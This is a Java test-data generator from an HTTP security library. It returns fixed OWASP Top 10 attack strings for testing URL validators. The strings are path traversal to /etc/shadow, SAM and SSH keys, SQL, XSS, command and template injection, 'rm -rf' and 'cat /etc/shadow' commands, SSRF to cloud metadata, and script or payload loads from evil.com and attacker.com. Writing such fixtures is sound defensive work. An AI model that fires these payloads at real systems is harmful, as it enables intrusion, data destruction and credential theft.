/*
 * Copyright © 2025 CUI-OpenSource-Software (info@cuioss.de)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package de.cuioss.tools.security.http.generators;

import de.cuioss.test.generator.Generators;
import de.cuioss.test.generator.TypedGenerator;

/**
 * Generator for OWASP Top 10 attack patterns.
 * 
 * <p>
 * Provides malicious patterns based on the OWASP Top 10 2021 security risks,
 * focusing on vulnerabilities that can be exploited through HTTP requests
 * and URL manipulation. Emphasizes path traversal, injection attacks, and
 * access control bypasses that are commonly found in web applications.
 * </p>
 * 
 * <h3>OWASP Top 10 Categories Covered</h3>
 * <ul>
 *   <li><strong>A01: Broken Access Control</strong>: Path traversal, privilege escalation</li>
 *   <li><strong>A03: Injection</strong>: SQL, XSS, Command injection patterns</li>
 *   <li><strong>A06: Vulnerable Components</strong>: Known vulnerability patterns</li>
 *   <li><strong>A07: Authentication Failures</strong>: Bypass attempts</li>
 *   <li><strong>A10: Server-Side Request Forgery (SSRF)</strong>: URL manipulation</li>
 * </ul>
 * 
 * <h3>Pattern Categories</h3>
 * <ul>
 *   <li>Classic path traversal with OWASP Testing Guide patterns</li>
 *   <li>Encoded traversal using multiple encoding schemes</li>
 *   <li>Injection attack vectors in URL contexts</li>
 *   <li>Access control bypass techniques</li>
 *   <li>SSRF and URL manipulation attacks</li>
 *   <li>Parameter pollution and HTTP header injection</li>
 * </ul>
 * 
 * Implements: Task T28 from HTTP verification test generators
 * 
 * @author Claude Code Generator  
 * @since 2.5
 */
public class OWASPTop10AttackGenerator implements TypedGenerator<String> {

    private final TypedGenerator<String> owaspAttackPatterns = Generators.fixedValues(
            // A01: Broken Access Control - Classic Path Traversal
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "../../../../etc/shadow",
            "../../../../../etc/hosts",
            "..\\..\\..\\..\\windows\\system32\\config\\sam",

            // A01: Path Traversal with Directory Prefix
            "/var/www/../../etc/passwd",
            "/usr/share/../../etc/shadow",
            "/home/user/../../etc/hosts",
            "C:\\inetpub\\wwwroot\\..\\..\\windows\\win.ini",

            // A01: Null Byte Path Traversal
            "../../../etc/passwd%00.jpg",
            "..\\..\\..\\windows\\win.ini%00.gif",
            "../../../../etc/shadow%00.pdf",
            "../../../etc/hosts%00.txt",

            // A01: Encoded Path Traversal (URL Encoding)
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fshadow",
            "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cconfig%5csam",

            // A01: Double Encoded Path Traversal
            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            "%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255cwin.ini",
            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fshadow",

            // A01: Unicode Encoded Path Traversal
            "\\u002e\\u002e\\u002f\\u002e\\u002e\\u002f\\u002e\\u002e\\u002fetc\\u002fpasswd",
            "\\u002e\\u002e\\u005c\\u002e\\u002e\\u005c\\u002e\\u002e\\u005cwindows\\u005cwin.ini",
            "%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002fetc%u002fpasswd",

            // A01: UTF-8 Overlong Encoding
            "%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd",
            "%c1%9c%c1%9c%c1%af%c1%9c%c1%9c%c1%afetc%c1%afpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",

            // A01: Mixed Case and Encoding
            "..%2F..%2f..%2Fetc%2Fpasswd",
            "..%5C..%5c..%5Cwindows%5Cwin.ini",
            "..%2f..%5c..%2fetc%2fhosts",

            // A01: Advanced Traversal Sequences
            "....//....//....//etc/passwd",
            "..;/..;/..;/etc/passwd",
            "..///..///..//etc/passwd",
            "..\\\\..\\\\..\\\\windows\\\\win.ini",

            // A03: Injection - SQL Injection in Path Context
            "/users/'; DROP TABLE users; --",
            "/search/' UNION SELECT * FROM passwords --",
            "/login/' OR '1'='1' --",
            "/admin/1' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a",

            // A03: XSS Injection in Path Context
            "/<script>alert('XSS')</script>",
            "/search/<img src=x onerror=alert('XSS')>",
            "/<svg onload=alert('XSS')>",
            "/redirect/<script src=http://evil.com/xss.js></script>",

            // A03: Command Injection in Path Context
            "/file;cat /etc/passwd",
            "/upload|ls -la /",
            "/download`whoami`",
            "/process;rm -rf /tmp/*",
            "/backup && cat /etc/shadow",

            // A03: LDAP Injection via Path Traversal
            "/users/../../../etc/passwd",
            "/search/../../../etc/shadow",
            "/directory/../../../etc/hosts",

            // A03: NoSQL Injection  
            "/users[$ne]=null",
            "/search/?username[$regex]=.*",
            "/api/users/?{\"$gt\":\"\"]}",

            // A06: Vulnerable Components - Path Traversal via Known Components
            "/struts2-showcase/../../../etc/passwd",
            "/spring-boot-actuator/../../../etc/shadow",
            "/.well-known/../../../etc/hosts",
            "/wp-admin/../../../windows/win.ini",
            "/drupal/../../../etc/passwd",
            "/jmx-console/../../../etc/shadow",

            // A07: Authentication Failures - Bypass Attempts
            "/admin/../user/profile",
            "/secure/../admin/data",
            "/auth/..%2f..%2fadmin",
            "/login/%2e%2e%2fadmin",
            "/protected/..\\admin",

            // A10: Server-Side Request Forgery (SSRF)
            "/redirect?url=http://localhost:22/",
            "/proxy?target=http://169.254.169.254/",
            "/fetch?url=file:///etc/passwd",
            "/load?src=http://localhost:6379/",
            "/include?path=http://attacker.com/payload",

            // Parameter Pollution Patterns  
            "/search?q=safe&q=../../../etc/passwd",
            "/upload?file=image.jpg&file=../../../../etc/shadow",
            "/api?data=normal&data=<script>alert(1)</script>",

            // HTTP Header Injection via Path
            "/redirect/\\r\\nSet-Cookie: admin=true",
            "/proxy/\\r\\nLocation: http://evil.com",
            "/api/\\r\\nX-Forwarded-For: 127.0.0.1",

            // Session Fixation via Path
            "/login?jsessionid=ABC123../../../etc/passwd",
            "/auth?PHPSESSID=XYZ789../../../etc/shadow",
            "/secure?sid=DEF456..\\..\\..\\windows\\win.ini",

            // File Extension Bypass
            "/upload/shell.php%00.jpg",
            "/files/backdoor.jsp%00.gif",
            "/documents/payload.asp%00.pdf",

            // Protocol Handler Attacks with Path Traversal
            "../../../etc/passwd",
            "../../../etc/shadow",
            "../../../../etc/hosts",
            "../../../windows/win.ini",
            "../../../../windows/system32/config/sam",

            // Integer Overflow in Path Length
            "/long_path_segment/../../../etc/passwd",
            "/extended_directory/..\\..\\..\\windows\\win.ini",
            "/long_component/../../../../etc/shadow",

            // Zip Slip / Archive Traversal
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system.ini",
            "../../../../home/user/.ssh/id_rsa",

            // Template Injection
            "/${7*7}/etc/passwd",
            "/{{7*7}}/etc/passwd",
            "/%{7*7}/etc/passwd",
            "/#{7*7}/etc/passwd",

            // Path Confusion Attacks
            "/normal/path/../../../etc/passwd",
            "/allowed/dir/..\\..\\..\\windows\\win.ini",
            "/public/files/../../../../etc/shadow",

            // Case Sensitivity Bypass
            "/Admin/../../../etc/passwd",
            "/ADMIN/../../../ETC/PASSWD",
            "/admin/../../../Etc/Passwd",
            "/AdMiN/../../../eTc/PaSsWd",

            // Symlink Traversal
            "/tmp/link/../../../etc/passwd",
            "/var/tmp/symlink/../../../etc/shadow",
            "/home/symlink/../../../etc/hosts",

            // Web Shell Upload Paths with Traversal
            "/uploads/../../../etc/passwd",
            "/files/../../../etc/shadow",
            "/temp/../../../etc/hosts",
            "/images/../../../windows/win.ini",

            // Config File Access
            "/../../../etc/httpd/conf/httpd.conf",
            "/..\\..\\..\\apache\\conf\\httpd.conf",
            "/../../../etc/nginx/nginx.conf",
            "/..\\..\\..\\inetpub\\wwwroot\\web.config"
    );

    @Override
    public String next() {
        return owaspAttackPatterns.next();
    }

    @Override
    public Class<String> getType() {
        return String.class;
    }
}